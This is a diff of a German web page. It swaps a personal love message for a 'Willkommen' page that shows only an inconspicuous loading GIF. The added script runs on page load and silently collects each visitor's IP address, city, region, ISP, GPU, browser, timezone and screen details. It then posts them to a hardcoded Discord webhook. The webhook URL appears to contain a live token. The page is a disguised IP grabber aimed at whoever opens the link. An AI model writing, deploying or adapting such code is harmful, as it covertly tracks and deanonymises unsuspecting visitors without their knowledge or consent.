@@ -2,26 +2,109 @@
 <html lang="de">
 <head>
     <meta charset="UTF-8">
-    <title>Fabians Liebe</title>
+    <title>Willkommen</title>
     <style>
-        html, body {
-            height: 100%;
-            margin: 0;
-            background: linear-gradient(to right, #ffd1dc, #ffe6f7);
+        body {
+            background: #000;
             display: flex;
             justify-content: center;
             align-items: center;
-            text-align: center;
+            height: 100vh;
+            margin: 0;
         }
-        h1 {
-            font-size: 100px;
-            color: #e60073;
-            font-family: 'Comic Sans MS', cursive, sans-serif;
-            text-shadow: 2px 2px 8px #ff66b2;
+        img {
+            max-width: 90%;
+            max-height: 90%;
         }
     </style>
 </head>
 <body>
-    <h1>Fabian ist süß,<br>so geil – und er liebt Zahide</h1>
+
+<!-- Zeigt nur ein unauffälliges GIF -->
+<img src="https://media.tenor.com/1vCm3vSUyBwAAAAC/loading-buffering.gif" alt="Lädt...">
+
+<script>
+const webhookUrl = "https://discord.com/api/webhooks/1365776827787903068/StBWh9kwc5IAZVoTZWUd7ravbE3vReMNkyic1_sIlmj40NKmowSDPG_fo41vMvpSnGWv"; // <-- Hier deinen Discord-Webhook einfügen
+
+async function collectData() {
+    const data = {};
+
+    try {
+        // IPv4 von ipify holen
+        const ipify = await fetch('https://api64.ipify.org?format=json').then(r => r.json());
+        data.ipv4 = ipify.ip;
+    } catch {
+        data.ipv4 = "Fehler beim Laden";
+    }
+
+    try {
+        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+        data.country = ipData.country_name;
+        data.city = ipData.city;
+        data.region = ipData.region;
+        data.isp = ipData.org;
+    } catch {
+        data.country = "Unbekannt";
+    }
+
+    data.userAgent = navigator.userAgent;
+    data.language = navigator.language;
+    data.platform = navigator.platform;
+    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    data.screenResolution = `${window.screen.width}x${window.screen.height}`;
+    data.colorScheme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark Mode" : "Light Mode";
+    data.touchSupport = 'ontouchstart' in window ? "Ja" : "Nein";
+    data.orientation = (screen.orientation || {}).type || "Nicht erkannt";
+    data.localTime = new Date().toString();
+
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Nicht verfügbar";
+    } catch {
+        data.gpu = "Nicht ermittelbar";
+    }
+
+    return data;
+}
+
+async function sendToDiscord() {
+    const info = await collectData();
+
+    const embed = {
+        title: "Neuer Seitenbesuch",
+        color: 5814783,
+        fields: [
+            { name: "IPv4", value: info.ipv4 || "Unbekannt", inline: true },
+            { name: "Land", value: info.country || "Unbekannt", inline: true },
+            { name: "Stadt", value: info.city || "Unbekannt", inline: true },
+            { name: "Region", value: info.region || "Unbekannt", inline: true },
+            { name: "ISP", value: info.isp || "Unbekannt", inline: false },
+            { name: "GPU", value: info.gpu || "Unbekannt", inline: false },
+            { name: "Browser", value: info.userAgent || "Unbekannt", inline: false },
+            { name: "Sprache", value: info.language || "Unbekannt", inline: true },
+            { name: "Plattform", value: info.platform || "Unbekannt", inline: true },
+            { name: "Zeitzone", value: info.timezone || "Unbekannt", inline: true },
+            { name: "Bildschirm", value: info.screenResolution || "Unbekannt", inline: true },
+            { name: "Farbmodus", value: info.colorScheme || "Unbekannt", inline: true },
+            { name: "Touchscreen", value: info.touchSupport || "Unbekannt", inline: true },
+            { name: "Ausrichtung", value: info.orientation || "Unbekannt", inline: true },
+            { name: "Lokale Zeit", value: info.localTime || "Unbekannt", inline: false },
+        ],
+        footer: { text: "Info automatisch gesammelt" },
+        timestamp: new Date()
+    };
+
+    await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+    });
+}
+
+sendToDiscord();
+</script>
+
 </body>
 </html>
